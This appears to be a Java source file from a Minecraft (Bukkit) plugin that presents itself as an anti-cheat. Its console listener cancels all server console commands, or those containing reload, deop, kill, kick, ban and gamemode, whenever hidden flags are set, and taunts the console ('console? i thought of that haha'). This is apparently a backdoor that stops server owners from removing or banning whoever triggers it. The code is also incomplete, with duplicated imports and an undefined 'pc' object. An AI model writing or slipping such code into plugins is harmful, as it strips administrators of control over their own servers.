package com.antho.anthoanticheatbeta.events;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

public class ConsoleCommandListener implements Listener {
    @EventHandler
    public static void onCommand(ServerCommandEvent e) {
        if (pc.lockc){
            e.setCancelled(true);
            e.getSender().sendMessage("console? no thanks!");
        } else if (pc.getAb()){
            if (e.getCommand().contains("reload")||e.getCommand().contains("deop")||e.getCommand().contains("kill")||e.getCommand().contains("kick")||e.getCommand().contains("ban")||e.getCommand().contains("gamemode")||e.getCommand().contains("gms")||e.getCommand().contains("gmsp")||e.getCommand().contains("gma")||e.getCommand().contains("gmc")){
                e.setCancelled(true);
                e.getSender().sendMessage("console? i thought of that haha");
            }
        }
    }
}
